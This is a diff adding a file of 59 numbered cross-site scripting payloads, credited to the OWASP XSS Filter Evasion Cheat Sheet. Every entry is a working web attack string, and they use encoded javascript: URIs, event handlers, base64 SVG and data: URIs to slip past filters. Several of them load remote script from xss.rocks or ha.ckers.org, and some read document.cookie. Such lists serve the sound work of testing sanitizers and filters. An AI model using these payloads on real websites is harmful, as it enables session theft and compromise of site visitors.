@@ -1,0 +1,119 @@
+#  vectors from https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
+
+1. <SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+
+2. <SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>
+
+3. <marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)>
+
+4. <script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script>
+
+5. <script>alert(document.cookie)</script>">
+
+6. <img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id)>'">
+
+7. <img src="http://www.shellypalmer.com/wp-content/images/2015/07/hacked-compressor.jpg">
+
+8. <Video> <source onerror = "javascript: alert (XSS)">
+
+9. <iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>
+
+10. <input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"
+
+11. <form><button formaction=javascript&colon;alert(1)>CLICKME
+
+12. <a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script:&#97lert(1)>ClickMe
+
+13. <IMG """><SCRIPT>alert("XSS")</SCRIPT>">
+
+14. <img/*%00/src="worksinchrome&colon;prompt(1)"/%00*/onerror='eval(src)'>
+
+15. <IMG SRC=# onmouseover="alert('xxs')">
+
+16. <IMG SRC= onmouseover="alert('xxs')">
+
+17. <IMG onmouseover="alert('xxs')">
+
+18. <IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>
+
+19. <img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">
+
+20. <svg><script>alert(1)</script>
+
+21. <meta http-equiv="refresh" content="0;url=javascript:confirm(1)">
+
+22. <IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
+
+23. <iframe/src="data:text/html,<svg onload=alert(1)>">
+
+24. <img src="x:gif" onerror="window['al\u0065rt'](0)"></img>
+
+25. <img src=x:alert(alt) onerror=eval(src) alt=0>
+
+26. <IMG SRC="jav&#x0D;ascript:alert('XSS');">
+
+27. <A HREF="javascript:document.location='http://www.google.com/'">XSS</A>
+
+28. <SCRIPT/XSS SRC="http://xss.rocks/xss.js"></SCRIPT>
+
+29. <Img src = x onerror = "javascript: window.onerror = alert; throw XSS">
+
+30. <SCRIPT/SRC="http://xss.rocks/xss.js"></SCRIPT>
+
+31. <<SCRIPT>alert("XSS");//<</SCRIPT>
+
+32. <SCRIPT SRC=http://xss.rocks/xss.js?< B >
+
+33. <SCRIPT SRC=//xss.rocks/.j>
+
+34. <IMG SRC="javascript:alert('XSS')"
+
+35. <applet code="javascript:confirm(document.cookie);">
+
+36. </script><script>alert('XSS');</script>
+
+37. </TITLE><SCRIPT>alert("XSS");</SCRIPT>
+
+38. <INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
+
+39. <link rel="dns-prefetch" href="//api.share.zhix.net">
+
+40. <object data="javascript:alert(XSS)">
+
+41. <IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>
+
+42. <OBJECT TYPE="text/x-scriptlet" DATA="http://xss.rocks/scriptlet.html"></OBJECT>
+
+43. <IFRAME SRC="javascript:alert('XSS');"></IFRAME>
+
+44. <isindex type=image src=1 onerror=alert(XSS)>
+
+45. <svg/onload=alert('XSS')>
+
+46. <BODY ONLOAD=alert('XSS')>
+
+47. <BGSOUND SRC="javascript:alert('XSS');">
+
+48. <EMBED SRC="http://ha.ckers.org/xss.swf" AllowScriptAccess="always"></EMBED>
+
+49. <LINK REL="stylesheet" HREF="javascript:alert('XSS');">
+
+50. <LINK REL="stylesheet" HREF="http://xss.rocks/xss.css">
+
+51. <FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
+
+52. <META HTTP-EQUIV="Link" Content="<http://xss.rocks/xss.css>; REL=stylesheet">
+
+53. <STYLE>BODY{-moz-binding:url("http://xss.rocks/xssmoz.xml#xss")}</STYLE>
+
+54. <EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>
+
+55. <XSS STYLE="behavior: url(xss.htc);">
+
+56. <STYLE TYPE="text/javascript">alert('XSS');</STYLE>
+
+57. <STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
+
+58. <STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
+
+59. <XSS STYLE="xss:expression(alert('XSS'))">
